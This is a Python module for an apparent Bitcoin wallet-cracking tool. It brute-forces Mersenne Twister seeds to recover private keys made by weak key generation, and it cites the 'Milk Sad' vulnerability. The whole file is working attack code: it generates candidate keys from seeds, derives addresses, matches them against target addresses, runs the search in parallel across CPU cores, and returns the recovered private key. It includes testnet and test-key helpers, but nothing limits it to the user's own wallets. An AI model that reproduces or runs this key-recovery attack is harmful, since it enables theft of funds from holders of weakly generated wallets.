"""
PRNG Reconstructor Module
=========================

Implements Mersenne Twister (MT19937) PRNG reconstruction attack.
Attempts to recover the seed used for weak key generation.

Attack Methodology:
1. Brute-force search through seed space (2^20 to 2^32)
2. Generate candidate private keys using MT19937
3. Derive Bitcoin addresses from candidate keys
4. Match against target addresses

Based on "Milk Sad" vulnerability research.
"""

import random
import hashlib
from typing import Optional, Callable, Tuple
from multiprocessing import Pool, cpu_count
import logging
from ecdsa import SigningKey, SECP256k1
from bitcoinlib.keys import Key


class PRNGReconstructor:
    """
    Reconstructs MT19937 PRNG seeds by brute-force search.
    
    Implements parallel seed space search optimized for AWS multi-core instances.
    """
    
    def __init__(self, config: dict):
        """
        Initialize the PRNG reconstructor.
        
        Args:
            config: Configuration dictionary with attack parameters
        """
        self.config = config
        
        # Determine seed space based on mode
        mode = config['prng_attack']['mode']
        if mode == 'test':
            self.seed_space = config['prng_attack']['seed_space_test_mode']
        else:
            self.seed_space = config['prng_attack']['seed_space_full_mode']
        
        self.parallel_workers = config['prng_attack']['parallel_workers']
        self.progress_interval = config['prng_attack']['progress_interval']
        self.testnet = config['bitcoin_network'] == 'testnet'
        
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"PRNG Reconstructor initialized: mode={mode}, seed_space={self.seed_space:,}")
    
    def generate_private_key_from_seed(self, seed: int) -> bytes:
        """
        Generate a private key using MT19937 with given seed.
        
        Args:
            seed: 32-bit integer seed for MT19937
            
        Returns:
            32-byte private key
        """
        # Initialize MT19937 with seed
        rng = random.Random(seed)
        
        # Generate 32 bytes (256 bits) for private key
        key_bytes = bytes([rng.randint(0, 255) for _ in range(32)])
        
        return key_bytes
    
    def private_key_to_address(self, private_key: bytes) -> str:
        """
        Derive Bitcoin address from private key.
        
        Args:
            private_key: 32-byte private key
            
        Returns:
            Bitcoin address string
        """
        try:
            # Use bitcoinlib for address derivation
            key = Key(private_key.hex(), network='testnet' if self.testnet else 'bitcoin')
            address = key.address()
            return address
        
        except Exception as e:
            self.logger.debug(f"Failed to derive address: {e}")
            return ""
    
    def test_seed_single(self, seed: int, target_address: str) -> Optional[int]:
        """
        Test a single seed against a target address.
        
        Args:
            seed: Seed value to test
            target_address: Bitcoin address to match
            
        Returns:
            Seed value if match found, None otherwise
        """
        try:
            # Generate private key from seed
            private_key = self.generate_private_key_from_seed(seed)
            
            # Derive address
            derived_address = self.private_key_to_address(private_key)
            
            # Check for match
            if derived_address == target_address:
                return seed
            
            return None
        
        except Exception as e:
            self.logger.debug(f"Error testing seed {seed}: {e}")
            return None
    
    def search_seed_range(self, start_seed: int, end_seed: int, target_address: str, 
                         progress_callback: Optional[Callable] = None) -> Optional[Tuple[int, bytes]]:
        """
        Search a range of seeds for a match.
        
        Args:
            start_seed: Starting seed value (inclusive)
            end_seed: Ending seed value (exclusive)
            target_address: Bitcoin address to match
            progress_callback: Optional callback for progress updates
            
        Returns:
            Tuple of (seed, private_key) if found, None otherwise
        """
        self.logger.debug(f"Searching seed range {start_seed:,} to {end_seed:,}")
        
        for seed in range(start_seed, end_seed):
            # Progress reporting
            if progress_callback and seed % self.progress_interval == 0:
                progress_callback(seed, end_seed)
            
            result = self.test_seed_single(seed, target_address)
            if result is not None:
                private_key = self.generate_private_key_from_seed(result)
                self.logger.info(f"MATCH FOUND! Seed: {result}")
                return (result, private_key)
        
        return None
    
    def parallel_search_worker(self, args: Tuple[int, int, str]) -> Optional[Tuple[int, bytes]]:
        """
        Worker function for parallel seed search.
        
        Args:
            args: Tuple of (start_seed, end_seed, target_address)
            
        Returns:
            Tuple of (seed, private_key) if found, None otherwise
        """
        start_seed, end_seed, target_address = args
        
        # Create local logger for worker
        worker_logger = logging.getLogger(f"{__name__}.worker.{start_seed}")
        
        worker_logger.debug(f"Worker starting: seeds {start_seed:,} to {end_seed:,}")
        
        result = self.search_seed_range(start_seed, end_seed, target_address)
        
        if result:
            worker_logger.info(f"Worker found match: seed={result[0]}")
        
        return result
    
    def reconstruct_seed_parallel(self, target_address: str, max_seed: Optional[int] = None) -> Optional[Tuple[int, bytes]]:
        """
        Attempt to reconstruct PRNG seed using parallel search.
        
        Distributes seed space across multiple CPU cores for faster search.
        
        Args:
            target_address: Bitcoin address to find seed for
            max_seed: Maximum seed to search (default: configured seed_space)
            
        Returns:
            Tuple of (seed, private_key) if found, None otherwise
        """
        if max_seed is None:
            max_seed = self.seed_space
        
        self.logger.info(f"Starting parallel seed reconstruction for {target_address}")
        self.logger.info(f"Seed space: 0 to {max_seed:,} ({max_seed:e})")
        self.logger.info(f"Workers: {self.parallel_workers}")
        
        # Calculate chunk size for each worker
        chunk_size = max_seed // self.parallel_workers
        
        # Create work chunks
        work_chunks = []
        for i in range(self.parallel_workers):
            start = i * chunk_size
            end = (i + 1) * chunk_size if i < self.parallel_workers - 1 else max_seed
            work_chunks.append((start, end, target_address))
        
        # Execute parallel search
        with Pool(processes=self.parallel_workers) as pool:
            results = pool.map(self.parallel_search_worker, work_chunks)
        
        # Check for matches
        for result in results:
            if result is not None:
                seed, private_key = result
                self.logger.info(f"Seed reconstruction successful: seed={seed}")
                return result
        
        self.logger.info("Seed reconstruction failed: no match found in search space")
        return None
    
    def reconstruct_seed_sequential(self, target_address: str, max_seed: Optional[int] = None) -> Optional[Tuple[int, bytes]]:
        """
        Attempt to reconstruct PRNG seed using sequential search.
        
        Single-threaded version for simpler execution or debugging.
        
        Args:
            target_address: Bitcoin address to find seed for
            max_seed: Maximum seed to search (default: configured seed_space)
            
        Returns:
            Tuple of (seed, private_key) if found, None otherwise
        """
        if max_seed is None:
            max_seed = self.seed_space
        
        self.logger.info(f"Starting sequential seed reconstruction for {target_address}")
        self.logger.info(f"Seed space: 0 to {max_seed:,}")
        
        # Progress tracking
        def progress_callback(current: int, total: int):
            if current % (self.progress_interval * 10) == 0:
                percent = (current / total) * 100
                self.logger.info(f"Progress: {current:,}/{total:,} ({percent:.2f}%)")
        
        result = self.search_seed_range(0, max_seed, target_address, progress_callback)
        
        if result:
            seed, private_key = result
            self.logger.info(f"Seed reconstruction successful: seed={seed}")
            return result
        
        self.logger.info("Seed reconstruction failed: no match found in search space")
        return None
    
    def verify_seed(self, seed: int, target_address: str) -> bool:
        """
        Verify that a seed produces the target address.
        
        Args:
            seed: Seed to verify
            target_address: Expected Bitcoin address
            
        Returns:
            True if seed produces target address, False otherwise
        """
        private_key = self.generate_private_key_from_seed(seed)
        derived_address = self.private_key_to_address(private_key)
        
        matches = derived_address == target_address
        
        if matches:
            self.logger.info(f"Seed verification successful: seed={seed}")
        else:
            self.logger.warning(f"Seed verification failed: seed={seed}")
        
        return matches
    
    def estimate_search_time(self, seed_space: Optional[int] = None) -> dict:
        """
        Estimate time required for seed space search.
        
        Args:
            seed_space: Seed space size (default: configured)
            
        Returns:
            Dictionary with time estimates
        """
        if seed_space is None:
            seed_space = self.seed_space
        
        # Benchmark: test a small sample
        import time
        
        test_address = "tb1qw508d6qejxtdg4y5r3zarvary0c5xw7kxpjzsx"  # Example testnet address
        test_seeds = 10000
        
        start_time = time.time()
        for seed in range(test_seeds):
            self.test_seed_single(seed, test_address)
        elapsed = time.time() - start_time
        
        # Calculate rates
        seeds_per_second = test_seeds / elapsed
        
        # Estimate total time
        total_seconds = seed_space / seeds_per_second
        total_seconds_parallel = total_seconds / self.parallel_workers
        
        return {
            'seed_space': seed_space,
            'seeds_per_second': int(seeds_per_second),
            'workers': self.parallel_workers,
            'estimated_time_sequential': {
                'seconds': int(total_seconds),
                'minutes': int(total_seconds / 60),
                'hours': round(total_seconds / 3600, 2),
                'days': round(total_seconds / 86400, 2)
            },
            'estimated_time_parallel': {
                'seconds': int(total_seconds_parallel),
                'minutes': int(total_seconds_parallel / 60),
                'hours': round(total_seconds_parallel / 3600, 2),
                'days': round(total_seconds_parallel / 86400, 2)
            }
        }
    
    def create_weak_key_for_testing(self, seed: int) -> Tuple[str, bytes]:
        """
        Create a weak key with known seed for testing purposes.
        
        Args:
            seed: Seed to use
            
        Returns:
            Tuple of (address, private_key)
        """
        private_key = self.generate_private_key_from_seed(seed)
        address = self.private_key_to_address(private_key)
        
        self.logger.info(f"Created test weak key: seed={seed}, address={address}")
        
        return address, private_key
